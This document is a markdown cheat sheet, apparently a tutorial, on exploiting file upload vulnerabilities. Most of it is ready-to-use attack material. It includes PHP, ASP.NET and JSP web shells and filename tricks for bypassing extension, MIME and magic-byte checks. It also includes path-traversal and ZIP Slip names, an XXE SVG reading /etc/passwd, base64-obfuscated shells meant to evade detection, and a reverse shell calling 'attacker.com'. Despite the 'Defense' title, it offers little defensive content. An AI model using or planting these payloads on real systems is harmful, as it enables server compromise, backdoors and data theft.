### üõ°Ô∏è File Upload Vulnerabilities: Concepts and Defense

File Upload Vulnerabilities occur when a web application allows users to upload files without **properly validating them**. Attackers can exploit this to upload malicious files that can lead to **Remote Code Execution (RCE)**, defacement, or server compromise.

  * **Injection Point:** File upload functionality lacking comprehensive server-side validation.
  * **Impact:** Remote code execution, data exfiltration, system compromise.
  * **Root Cause:** The core problem is the application's failure to enforce a strict **allow-list** (whitelisting) of file types and content, often relying on easily spoofed client-side data.

File upload vulnerabilities exist because developers often **trust user input** and fail to implement comprehensive validation. When applications don't properly verify file types, content, or names, attackers can upload malicious files that get executed on the server, typically because the file is saved in a location where the web server has execution permissions.

-----

### ‚öôÔ∏è Web Shells and Basic Payload Construction

The primary goal of an attacker is to upload a **web shell**, a script that provides a backdoor for executing system commands remotely. File uploads are performed using the `multipart/form-data` encoding.

  * **Basic PHP Web Shell**

    ```php
    <?php system($_GET['cmd']); ?>
    ```

    **Why it's used:** This is the most basic payload to execute arbitrary **operating system commands** on a PHP server.
    **How it works:** When accessed via `http://target.com/shell.php?cmd=ls -la`, the PHP `system()` function executes the command provided in the `cmd` query parameter.

  * **ASP.NET Web Shell**

    ```aspx
    <%@ Page Language="C#" %>
    <%@ Import Namespace="System.Diagnostics" %>
    <script runat="server">
        void Page_Load(object sender, EventArgs e){
            Response.Write("<pre>" + new System.Diagnostics.Process(){
                StartInfo = new System.Diagnostics.ProcessStartInfo(){
                    FileName = "cmd.exe", Arguments = "/c " + Request.QueryString["cmd"],
                    UseShellExecute = false, RedirectStandardOutput = true
                }
            }.StandardOutput.ReadToEnd() + "</pre>");
        }
    </script>
    ```

    **Why it's used:** To gain command execution on **IIS servers** running ASP.NET.
    **How it works:** It utilizes the .NET framework's `System.Diagnostics.Process` class to start the command interpreter (`cmd.exe`) and execute the command passed via the URL query string (`Request.QueryString["cmd"]`).

  * **JSP Web Shell**

    ```jsp
    <%@ page import="java.io.*" %>
    <%
        String cmd = request.getParameter("cmd");
        Process p = Runtime.getRuntime().exec(cmd);
        // ... code to read output ...
    %>
    ```

    **Why it's used:** For RCE on **Java application servers** (like Tomcat or JBoss) that process JSP files.
    **How it works:** It uses the standard Java `Runtime.getRuntime().exec(cmd)` method to execute an operating system command provided in the `cmd` request parameter.

-----

### üìù Extension Blacklist Bypass Techniques

Attackers use these methods when the application implements an extension blacklist (e.g., blocks `.php`, `.aspx`).

  * **Case Manipulation and Double Extensions**

    ```text
    shell.PHP      # Uppercase (Bypasses case-sensitive filters)
    shell.php.jpg  # Double extension (If server checks only the last extension)
    shell.jpg.php  # PHP at end (If server only checks the first extension)
    ```

    **Why it's used:** To exploit flaws in string parsing logic. Simple filters often check only for the literal blacklisted string or the last file extension.
    **How it works:** If the server is configured to treat files like `.PHP` as executable but the filter is case-sensitive and only blocks `.php`, the payload runs. Similarly, `shell.php.jpg` might satisfy a requirement for a `.jpg` extension while still being processed as PHP by the server due to misconfiguration.

  * **Rare PHP Extensions**

    ```text
    shell.php3   # PHP 3
    shell.php5   # PHP 5
    shell.phtml  # PHP HTML
    shell.inc    # Include file
    ```

    **Why it's used:** To exploit servers that have **alternative or older PHP handlers** configured but only block common extensions like `.php`.
    **How it works:** The web server configuration may include directives to execute files with extensions like `.phtml` or `.php5` as PHP scripts. The attacker tests these less-common extensions to find one that bypasses the blacklist but is still executable.

  * **Null Byte Injection**

    ```text
    shell.php%00.jpg
    ```

    **Why it's used:** To exploit older programming languages (like C/C++ or older PHP versions) that treat the null byte (`%00`) as the **end-of-string character**.
    **How it works:** The filter checks the filename and sees `.jpg` because the null byte causes the string to be truncated. The file saved on the disk, however, will be named `shell.php` because the filesystem write function stops at the null byte, resulting in an executable file.

-----

### üé≠ MIME Type and Magic Bytes Spoofing

These techniques are used to defeat validation checks based on the file's type and content.

  * **MIME Type Spoofing**

    ```http
    Content-Disposition: form-data; name="file"; filename="shell.php"
    Content-Type: image/jpeg 
    ```

    **Why it's used:** To bypass server-side validation that relies solely on the **Content-Type header** sent by the client.
    **How it works:** The attacker intercepts the HTTP request and changes the `Content-Type` from the script's MIME type to an allowed image type (`image/jpeg`). Since this header is client-controlled, if the server doesn't verify the actual file content, the upload succeeds.

  * **Magic Bytes Prepending (Content Validation Bypass)**

    ```bash
    # Command to prepend PNG magic bytes to the shell code
    echo -e '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php system($_GET["cmd"]); ?>' > shell.png
    ```

    **Why it's used:** To bypass deep content validation that checks the file's **magic bytes** (the file signature) at the start of the file.
    **How it works:** The attacker prepends the correct binary signature (e.g., the PNG sequence) to the malicious code. The validator sees the correct header and allows the file. The web server's script interpreter will then often ignore the binary header and execute the subsequent script code.

  * **GIF Magic Bytes + PHP**

    ```bash
    echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif
    ```

    **Why it's used:** This is specific to the GIF format, which has a short and simple header (`GIF89a`).
    **How it works:** By starting the file with the `GIF89a` header, the file satisfies the content check. The PHP interpreter starts reading from the beginning and executes the PHP code immediately after the short GIF signature.

-----

### üß¨ Polyglot Files and Path Traversal

These techniques represent a combination of content and path manipulation for high-impact exploitation.

  * **GIF/PHP Polyglot File Creation**

    ```php
    echo 'GIF89a<?php system($_GET["cmd"]); __halt_compiler();?>' > polyglot.gif
    ```

    **Why it's used:** To create a file that is **valid in two formats**, satisfying both the image content check and the script execution requirement.
    **How it works:** The file begins with the valid GIF header. The `__halt_compiler();` command is used to instruct the PHP interpreter to stop parsing the file immediately after the shell code, ensuring the interpreter does not try to process the remaining binary image data.

  * **Path Traversal in Filenames**

    ```text
    filename: ../../../var/www/html/shell.php
    ```

    **Why it's used:** To achieve **Arbitrary File Write** by manipulating the upload path, forcing the file to be saved in an executable directory.
    **How it works:** If the application constructs the final file path by blindly concatenating the upload path with the user-supplied filename, the `../` sequences allow the path to escape the intended upload directory and land in the public, executable web root (`/var/www/html`).

  * **Encoded Path Traversal**

    ```text
    filename: ..%2f..%2f..%2fshell.php
    filename: ..%252f..%252f..%252fshell.php
    ```

    **Why it's used:** To bypass filters that specifically block the literal string `../` by using URL encoding.
    **How it works:** The path characters are **URL-encoded** (`%2f` for `/` or double-encoded `%252f`). The filter might check the unencoded string, but an underlying file handling function may decode the path before writing, allowing the traversal to succeed.

-----

### üì¶ Archive and XML-Based Exploitation

These attacks target archive extractors and XML parsers often used for document processing.

  * **ZIP Slip Attack**

    ```bash
    # Content of the malicious ZIP: 
    # ../../../var/www/html/shell.php
    ```

    **Why it's used:** To achieve **Arbitrary File Write** when the application extracts archives without validating the file paths contained within the archive.
    **How it works:** The attacker creates a ZIP file where the internal file paths contain `../` sequences. When the extraction library fails to sanitize these paths, it writes the file outside the temporary extraction directory and into an arbitrary system location.

  * **XXE in SVG Files**

    ```xml
    <?xml version="1.0" standalone="yes"?>
    <!DOCTYPE test [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <svg ...>
        <text x="0" y="16">&xxe;</text>
    </svg>
    ```

    **Why it's used:** To achieve **File Disclosure** or **SSRF** when the server uses a vulnerable XML parser to process uploaded XML-based files (like SVG).
    **How it works:** The XML parser resolves the malicious **external entity** (`&xxe;`), which is instructed to retrieve the content of a local file (e.g., `/etc/passwd`). The parser inserts this file content where the entity is referenced, exposing the data.

-----

### ü•∑ Obfuscation and Advanced Shell Payloads

These techniques are used to evade Content-Based Intrusion Detection Systems (IDS) and keyword filters.

  * **Base64 Encoding and String Concatenation**

    ```php
    <?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>

    <?php 
        $a = 'sy' . 'stem';
        $b = $_GET['cmd'];
        $a($b); // Variable function call
    ?>
    ```

    **Why it's used:** To defeat static analysis tools that search for literal function names like `system()`, `exec()`, or `eval()`.
    **How it works:** By encoding the malicious code (Base64/Hex) or constructing the function name at runtime via **string concatenation**, the forbidden keyword never exists in the file content, only in memory during execution.

  * **Reverse Shell**

    ```php
    <?php
        $sock=fsockopen("attacker.com",4444);
        exec("/bin/sh -i <&3 >&3 2>&3");
    ?>
    ```

    **Why it's used:** To gain an **interactive shell session** (full keyboard access) instead of a simple command execution output.
    **How it works:** The script uses `fsockopen` to initiate an outbound connection from the compromised server back to an attacker's listening machine (netcat listener). It then redirects the standard I/O streams of a shell program (`/bin/sh`) over that socket.

  * **EXIF Data Injection**

    ```bash
    exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.jpg
    ```

    **Why it's used:** To hide malicious code within seemingly safe image metadata.
    **How it works:** The web shell code is written into a harmless metadata field (`Comment`). If the application processes the image but doesn't strip the metadata, and the web server later executes the file, the script will run as the interpreter parses the file content.

-----

**Made with love by VIsh0k**